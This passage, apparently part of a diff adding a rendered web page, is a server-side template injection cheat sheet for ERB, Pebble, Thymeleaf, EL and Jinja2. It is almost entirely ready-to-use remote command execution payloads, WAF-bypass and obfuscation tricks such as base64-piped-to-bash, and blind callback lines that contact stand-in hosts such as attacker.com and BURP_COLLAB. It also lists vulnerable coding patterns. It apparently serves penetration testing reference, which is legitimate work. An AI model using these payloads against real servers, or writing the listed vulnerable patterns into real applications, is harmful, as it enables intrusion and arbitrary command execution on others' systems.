+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="nb">require</span><span class="w"> </span><span class="s1">&#39;open3&#39;</span><span class="p">;</span><span class="w"> </span><span class="no">Open3</span><span class="o">.</span><span class="n">capture2</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="x"># %x</span>
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="sx">%x(id)</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span></code></pre></div>
+<h3 id="blind-detection_6">Blind Detection<a class="headerlink" href="#blind-detection_6" title="Permanent link">&para;</a></h3>
+<div class="language-erb highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="nb">system</span><span class="p">(</span><span class="s1">&#39;curl attacker.com&#39;</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="sb">`ping -c1 attacker.com`</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="sb">`sleep 5`</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="pebble-java">Pebble (Java)<a class="headerlink" href="#pebble-java" title="Permanent link">&para;</a></h2>
+<h3 id="detection_7">Detection<a class="headerlink" href="#detection_7" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>{{7*7}}
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>{{&quot;test&quot;.toUpperCase()}}
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>{{ beans }}
+</span></code></pre></div>
+<h3 id="rce_7">RCE<a class="headerlink" href="#rce_7" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a># Runtime
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>{% set cmd = &#39;id&#39; %}
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>{% set bytes = (1).TYPE.forName(&#39;java.lang.Runtime&#39;).methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>{{ (1).TYPE.forName(&#39;java.lang.String&#39;).constructors[0].newInstance(bytes) }}
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a># ProcessBuilder
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>{% set pb = (1).TYPE.forName(&#39;java.lang.ProcessBuilder&#39;).constructors[0].newInstance([[&#39;id&#39;]]) %}
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>{% set is = pb.start().inputStream %}
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>{% set bytes = is.readAllBytes() %}
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>{{ (1).TYPE.forName(&#39;java.lang.String&#39;).constructors[0].newInstance(bytes) }}
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a># One liner
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>{{&#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;id&#39;)}}
+</span></code></pre></div>
+<hr />
+<h2 id="thymeleaf-java">Thymeleaf (Java)<a class="headerlink" href="#thymeleaf-java" title="Permanent link">&para;</a></h2>
+<h3 id="detection_8">Detection<a class="headerlink" href="#detection_8" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>${7*7}
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>${T(java.lang.Runtime)}
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>[[${7*7}]]
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>[(${7*7})]
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>*{T(java.lang.System).getenv()}
+</span></code></pre></div>
+<h3 id="rce_8">RCE<a class="headerlink" href="#rce_8" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a># Expression
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>${T(java.lang.Runtime).getRuntime().exec(&#39;id&#39;)}
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a># Pre-processing
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>__${T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)}__::.x
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a># URL parameter injection
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>/path?lang=__$%7BT(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::.x
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a># SpEL
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(&#39;id&#39;)}
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a># With output
+</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;id&#39;).getInputStream())}
+</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>
+</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a># ProcessBuilder
+</span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&#39;id&#39;).getInputStream()).useDelimiter(&#39;\\A&#39;).next()}
+</span></code></pre></div>
+<h3 id="blind-detection_7">Blind Detection<a class="headerlink" href="#blind-detection_7" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>${T(java.lang.Runtime).getRuntime().exec(&#39;curl attacker.com&#39;)}
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>${T(java.lang.Runtime).getRuntime().exec(&#39;ping -c1 attacker.com&#39;)}
+</span></code></pre></div>
+<hr />
+<h2 id="el-expression-language-java">EL (Expression Language - Java)<a class="headerlink" href="#el-expression-language-java" title="Permanent link">&para;</a></h2>
+<h3 id="detection_9">Detection<a class="headerlink" href="#detection_9" title="Permanent link">&para;</a></h3>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="n">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="n">$</span><span class="p">{</span><span class="n">applicationScope</span><span class="p">}</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="n">$</span><span class="p">{</span><span class="n">sessionScope</span><span class="p">}</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="n">$</span><span class="p">{</span><span class="n">pageContext</span><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="rce_9">RCE<a class="headerlink" href="#rce_9" title="Permanent link">&para;</a></h3>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="err">#</span><span class="w"> </span><span class="n">Runtime</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">$</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">)}</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="err">#</span><span class="w"> </span><span class="n">Empty</span><span class="w"> </span><span class="n">array</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="n">$</span><span class="p">{</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">param</span><span class="p">.</span><span class="na">cmd</span><span class="p">)}</span><span class="o">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">id</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="err">#</span><span class="w"> </span><span class="n">ProcessBuilder</span>
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="n">$</span><span class="p">{</span><span class="n">pageContext</span><span class="p">.</span><span class="na">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">().</span><span class="na">getResource</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">)}</span>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="err">#</span><span class="w"> </span><span class="n">JSP</span><span class="w"> </span><span class="n">Shell</span>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="n">$</span><span class="p">{</span><span class="n">pageContext</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">().</span><span class="na">loadClass</span><span class="p">(</span><span class="s">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&quot;getRuntime&quot;</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">)}</span>
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="err">#</span><span class="w"> </span><span class="n">With</span><span class="w"> </span><span class="n">reflection</span>
+</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="n">$</span><span class="p">{</span><span class="s">&quot;&quot;</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="s">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="na">getMethods</span><span class="p">()</span><span class="o">[</span><span class="mi">6</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="s">&quot;java.lang.Runtime&quot;</span><span class="p">)).</span><span class="na">exec</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">)}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="generic-waf-bypasses">Generic WAF Bypasses<a class="headerlink" href="#generic-waf-bypasses" title="Permanent link">&para;</a></h2>
+<h3 id="unicodehex">Unicode/Hex<a class="headerlink" href="#unicodehex" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a># Hex
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>\x5f\x5f = __
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>\x2e = .
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a># Unicode
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>\u005f = _
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>\u002e = .
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a># Octal
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>\137 = _
+</span></code></pre></div>
+<h3 id="whitespace-alternatives">Whitespace Alternatives<a class="headerlink" href="#whitespace-alternatives" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a># Tab
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>{%09set%09x=7%09%}
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a># Newline
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>{%0aset%0ax=7%0a%}
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a># Comments
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>{{7*/**/7}}
+</span></code></pre></div>
+<h3 id="string-obfuscation">String Obfuscation<a class="headerlink" href="#string-obfuscation" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Jinja2 string concat</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="p">{{</span><span class="s2">&quot;__&quot;</span><span class="o">|</span><span class="s2">&quot;class&quot;</span><span class="o">|</span><span class="s2">&quot;__&quot;</span><span class="o">|</span><span class="n">join</span><span class="p">}}</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="c1"># Reverse</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="p">{{</span><span class="s2">&quot;__ssalc__&quot;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]}}</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="c1"># Base64 in runtime</span>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">X</span><span class="p">](</span><span class="s1">&#39;echo aWQ=|base64 -d|bash&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()}}</span>
+</span></code></pre></div>
+<h3 id="character-building">Character Building<a class="headerlink" href="#character-building" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># From chr</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">X</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)}}</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c1"># Lipsum ASCII</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="p">{{</span><span class="n">lipsum</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="mi">25</span><span class="p">)}}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="common-vulnerable-patterns">Common Vulnerable Patterns<a class="headerlink" href="#common-vulnerable-patterns" title="Permanent link">&para;</a></h2>
+<h3 id="pythonflask">Python/Flask<a class="headerlink" href="#pythonflask" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Render string from user input</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="n">render_template_string</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">))</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1"># Format string templates  </span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="n">template</span> <span class="o">=</span> <span class="s2">&quot;Hello </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">user_input</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Hello </span><span class="si">{</span><span class="n">user_input</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="n">template</span> <span class="o">=</span> <span class="s2">&quot;Hello </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="phptwig">PHP/Twig<a class="headerlink" href="#phptwig" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="x">// User input in template</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="x">$twig-&gt;render(&quot;Hello &quot; . $_GET[&#39;name&#39;]);</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="x">// Loading user template</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="x">$twig-&gt;render($_GET[&#39;template&#39;]);</span>
+</span></code></pre></div>
+<h3 id="javafreemarker">Java/Freemarker<a class="headerlink" href="#javafreemarker" title="Permanent link">&para;</a></h3>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1">// String template with user input</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">template</span><span class="p">.</span><span class="na">process</span><span class="p">(</span><span class="n">dataModel</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">);</span><span class="w">  </span><span class="c1">// dataModel contains user input directly</span>
+</span></code></pre></div>
+<h3 id="rubyerb">Ruby/ERB<a class="headerlink" href="#rubyerb" title="Permanent link">&para;</a></h3>
+<div class="language-ruby highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Render user input</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:template</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">result</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="c1"># Interpolation</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="s2">&quot;Hello </span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">]</span><span class="si">}</span><span class="s2">&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="blind-ssti-detection-techniques">Blind SSTI Detection Techniques<a class="headerlink" href="#blind-ssti-detection-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="time-based">Time-Based<a class="headerlink" href="#time-based" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Jinja2</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;sleep 5&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c1"># Twig</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="p">{{[</span><span class="s1">&#39;sleep 5&#39;</span><span class="p">]</span><span class="o">|</span><span class="nb">filter</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)}}</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="c1"># Freemarker</span>
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="err">$</span><span class="p">{</span><span class="s2">&quot;freemarker.template.utility.Execute&quot;</span><span class="err">?</span><span class="n">new</span><span class="p">()(</span><span class="s2">&quot;sleep 5&quot;</span><span class="p">)}</span>
+</span></code></pre></div>
+<h3 id="dnshttp-callback">DNS/HTTP Callback<a class="headerlink" href="#dnshttp-callback" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Jinja2</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;curl http://BURP_COLLAB&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;nslookup BURP_COLLAB&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
